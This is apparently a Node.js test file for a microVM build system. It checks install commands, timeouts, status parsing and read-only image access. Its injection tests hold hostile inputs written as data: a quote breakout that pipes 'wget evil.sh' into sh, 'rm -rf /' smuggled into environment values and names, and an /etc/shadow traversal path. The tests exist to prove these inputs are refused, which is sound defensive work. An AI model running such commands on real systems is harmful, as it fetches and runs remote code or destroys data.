import { test } from "node:test";
import assert from "node:assert/strict";
import {
  BUILD_SLOT, BUILD_MEM_MIB, BUILD_TIMEOUT_S, STATUS_PATH, STARTED_PATH,
  installCommands, renderBuildInit, parseStatus, debugfsReadArgs,
} from "./build.mjs";
import { SLOT_COUNT } from "./network.mjs";
import { VM_MEM_MIB } from "./machine.mjs";

const OK = { commands: ["npm ci --omit=dev"] };
const code = (init) => init.split("\n").filter((l) => !l.trim().startsWith("#")).join("\n");

// ---- what gets run -------------------------------------------------------

test("a lockfile is honoured", () => {
  // npm ci installs exactly what is pinned and fails if the lockfile and
  // manifest disagree -- the difference between deploying what was tested and
  // deploying whatever the registry served today.
  assert.match(installCommands("node", { lockfile: true })[0], /^npm ci\b/);
  assert.match(installCommands("node", { lockfile: false })[0], /^npm install\b/);
});

test("dev dependencies are never installed", () => {
  for (const lockfile of [true, false]) {
    assert.match(installCommands("node", { lockfile })[0], /--omit=dev/);
  }
});

test("python installs from whichever manifest exists", () => {
  assert.match(installCommands("python", { manifest: "requirements.txt" })[0], /-r requirements\.txt/);
  assert.match(installCommands("python", { manifest: "pyproject.toml" })[0], /pip install .*\.$/);
  assert.match(installCommands("python", { manifest: "setup.py" })[0], /pip install .*\.$/);
});

test("a project with no dependencies is a success, not an error", () => {
  // A single-file Flask app is a perfectly good project.
  assert.deepEqual(installCommands("python", { manifest: null }), []);
  const i = renderBuildInit({ commands: [] });
  assert.match(code(i), /rc=0/);
  assert.match(i, /no dependencies to install/);
});

test("an unknown runtime is refused", () => {
  for (const bad of ["ruby", "", null, undefined, 42]) {
    assert.throws(() => installCommands(bad), /no install command/, JSON.stringify(bad));
  }
});

// ---- the build init ------------------------------------------------------

test("a failed install does not kill the guest before it records why", () => {
  // No set -e. The exit code is the product here; dying first would turn every
  // failed install into an indistinguishable silent one.
  const c = code(renderBuildInit(OK));
  assert.ok(!/^set -e/m.test(c), "set -e would lose the exit code");
  assert.match(c, /rc=\$\?/);
  assert.match(c, new RegExp(`echo "\\$rc" > ${STATUS_PATH}`));
});

test("the guest marks that it started before doing anything", () => {
  // Otherwise a VM that died during boot and one whose install failed look
  // identical from outside: a missing status file.
  const c = code(renderBuildInit(OK));
  assert.ok(c.indexOf(STARTED_PATH) < c.indexOf("cd /app"), "the marker must come first");
});

test("the status is synced before power off", () => {
  // Without sync the status can still be in the page cache when the VM stops,
  // and the host reads an image that never received it.
  const c = code(renderBuildInit(OK));
  const wrote = c.lastIndexOf(STATUS_PATH);
  const synced = c.indexOf("sync", wrote);
  const off = c.indexOf("poweroff", wrote);
  assert.ok(synced > wrote, "sync must follow the status write");
  assert.ok(off > synced, "poweroff must follow the sync");
});

test("the install itself does not run as root", () => {
  assert.match(code(renderBuildInit(OK)), /su-exec 1000:1000/);
});

test("the guest enforces its own timeout too", () => {
  // Belt and braces with the host's. If this one works the host never has to
  // kill anything, and a status file is far easier to act on than a process
  // that simply vanished.
  const c = code(renderBuildInit(OK));
  assert.match(c, new RegExp(`timeout -s KILL ${BUILD_TIMEOUT_S}`));
});

test("an absurd timeout is refused", () => {
  for (const bad of [0, 9, 1801, 60.5, "300", null]) {
    assert.throws(() => renderBuildInit({ ...OK, timeoutSeconds: bad }), /refusing build timeout/);
  }
});

test("the build VM is fatter than an app VM", () => {
  // npm install peaks far above what the app it produces will ever use.
  assert.ok(BUILD_MEM_MIB > VM_MEM_MIB, `${BUILD_MEM_MIB} should exceed ${VM_MEM_MIB}`);
});

test("the build slot is a real slot and not one an app can hold", () => {
  assert.ok(Number.isInteger(BUILD_SLOT));
  assert.ok(BUILD_SLOT >= 0 && BUILD_SLOT < SLOT_COUNT);
  // Ten apps plus one build must fit inside the slot range with the build slot
  // excluded from app allocation.
  assert.ok(SLOT_COUNT - 1 >= 10, "at least 10 app slots must remain");
});

// ---- injection -----------------------------------------------------------

test("an install command cannot break out of its quotes", () => {
  // These become lines in a shell script running as pid 1 with network.
  assert.throws(() => renderBuildInit({ commands: ["npm ci'; wget evil.sh -O- | sh; echo '"] }), /single quote/);
  assert.throws(() => renderBuildInit({ commands: ["npm ci\nwget evil"] }), /newline/);
  assert.throws(() => renderBuildInit({ commands: ["a\0b"] }), /null byte/);
});

test("a hostile environment value or name is refused", () => {
  assert.throws(() => renderBuildInit({ ...OK, env: { X: "a'; rm -rf /; echo '" } }), /single quote/);
  assert.throws(() => renderBuildInit({ ...OK, env: { X: "a\nb" } }), /newline/);
  assert.throws(() => renderBuildInit({ ...OK, env: { "X; rm -rf /": "y" } }), /invalid name/);
});

test("commands must be an array, not a string", () => {
  assert.throws(() => renderBuildInit({ commands: "npm ci" }), /must be an array/);
});

// ---- reading the result back ---------------------------------------------

test("a clean build is reported as one", () => {
  const r = parseStatus({ started: "1", status: "0\n" });
  assert.equal(r.ok, true);
  assert.equal(r.code, 0);
});

test("every failure mode says something a person can act on", () => {
  const boot = parseStatus({ started: "", status: "" });
  assert.equal(boot.ok, false);
  assert.match(boot.reason, /never started/);

  const hung = parseStatus({ started: "1", status: "" });
  assert.equal(hung.ok, false);
  assert.match(hung.reason, /did not finish/);

  const killed = parseStatus({ started: "1", status: "137" });
  assert.match(killed.reason, /exceeded/);

  const noApp = parseStatus({ started: "1", status: "90" });
  assert.match(noApp.reason, /no \/app/);

  const failed = parseStatus({ started: "1", status: "1" });
  assert.equal(failed.ok, false);
  assert.match(failed.reason, /exit code 1/);
});

test("a build that never booted is distinguished from one that timed out", () => {
  // The whole reason the started marker exists.
  const a = parseStatus({ started: "", status: "" });
  const b = parseStatus({ started: "1", status: "" });
  assert.notEqual(a.reason, b.reason);
});

test("garbage in the status file does not read as success", () => {
  // Written as \u0000, never as a literal byte. A NUL in the source
  // makes git treat the whole file as binary, so it shows as "Bin 0 -> 8176
  // bytes" in review instead of as a diff. That happened here.
  for (const junk of ["yes", "0x0", "-1", "0 ", "99999", " ", "\u0000", "0; rm -rf /"]) {
    const r = parseStatus({ started: "1", status: junk });
    if (junk.trim() === "0") continue;
    assert.equal(r.ok, false, `${JSON.stringify(junk)} must not read as success`);
  }
  // Missing entirely, which is what debugfs prints for a file that is not there.
  assert.equal(parseStatus({}).ok, false);
  assert.equal(parseStatus({ started: undefined, status: undefined }).ok, false);
});

// ---- reading without mounting --------------------------------------------

test("the image is read without being mounted", () => {
  // The host must never mount a filesystem a stranger's build just wrote to.
  const a = debugfsReadArgs("/opt/boxcode-apps/k9depef6/rootfs.ext4", STATUS_PATH);
  assert.deepEqual(a, ["-R", `cat ${STATUS_PATH}`, "/opt/boxcode-apps/k9depef6/rootfs.ext4"]);
  assert.ok(!a.includes("-w"), "must not open the image for writing");
});

test("a path that could escape is refused", () => {
  for (const bad of ["../x", "x", "/a/../../etc/shadow", "", null, 42]) {
    assert.throws(() => debugfsReadArgs(bad, "/s"), /refusing image path/);
    assert.throws(() => debugfsReadArgs("/i/x.ext4", bad), /refusing guest path/);
  }
});

test("the build init sets PATH too", () => {
  // Same failure, same fix: su-exec is in /sbin and pid 1 has no PATH.
  const c = code(renderBuildInit(OK));
  const path = c.split("\n").find((l) => l.startsWith("export PATH="));
  assert.ok(path, "build init must set PATH");
  assert.ok(path.includes("/sbin"), path);
  assert.ok(c.indexOf("export PATH=") < c.indexOf("su-exec"));
});

test("only the build init writes a resolver", () => {
  // The base image ships an empty /etc/resolv.conf because an app microVM has
  // no route off the box. The build VM is the one exception -- it has NAT and
  // has to reach a package registry -- so it writes its own here. npm failing
  // with EAI_AGAIN on a real box is what this is for.
  const c = code(renderBuildInit(OK));
  assert.match(c, /nameserver/, "the build init must provide a resolver");
  assert.ok(c.indexOf("resolv.conf") < c.indexOf("cd /app"), "before the install runs");
});

test("the build has somewhere to cache, and does not ship it", () => {
  // The app user is created with no home. npm fails outright with EACCES on
  // mkdir /home/app rather than falling back, which is how this was found.
  const c = code(renderBuildInit(OK));
  assert.match(c, /export HOME=/);
  assert.match(c, /npm_config_cache=/);
  // And the cache is removed before the status is written, so it is gone
  // whether the install succeeded or failed.
  assert.ok(c.indexOf("rm -rf /tmp/.npm") < c.lastIndexOf(STATUS_PATH));
});
